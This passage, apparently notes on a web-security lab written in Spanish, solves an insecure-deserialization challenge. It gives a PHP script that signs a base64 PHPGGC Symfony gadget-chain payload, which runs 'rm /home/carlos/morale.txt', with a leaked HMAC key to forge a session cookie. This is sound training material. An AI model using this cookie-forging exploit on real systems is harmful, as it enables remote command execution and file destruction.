Con la clave secreta descubierta, se utiliza la herramienta PHPGGC para generar un objeto serializado con un payload que elimina el archivo ‘**morale.txt**‘ de Carlos.

Este objeto se firma con HMAC SHA-1 utilizando la clave obtenida previamente, lo que permite generar una cookie válida que el servidor aceptará.

Finalmente, esta cookie maliciosa se inyecta en la sesión y, al ser deserializada por el backend de Symfony, se ejecuta el payload, logrando así la ejecución remota de comandos y la resolución del laboratorio.

Solucion
tal que quedaria asi
![Pasted_image_20250826230500.png](/Imagenes/Pasted_image_20250826230500.png)
entonce ahora nos creamos un archivo php
tal que quedaria asi
esto se llamaria generate.php
(<?php

    $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";

    $secretKey = "o2ioz9tnt51e0mvw6w5636h6m6thyuti";

    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');

    echo $cookie;
?>)
entonces ahora si lo vemos copiamos y pegamos
![Pasted_image_20250826231902.png](/Imagenes/Pasted_image_20250826231902.png)
el codigo que nos ah arrojado en la coockie de session en la pagina
![Pasted_image_20250826231955.png](/Imagenes/Pasted_image_20250826231955.png)


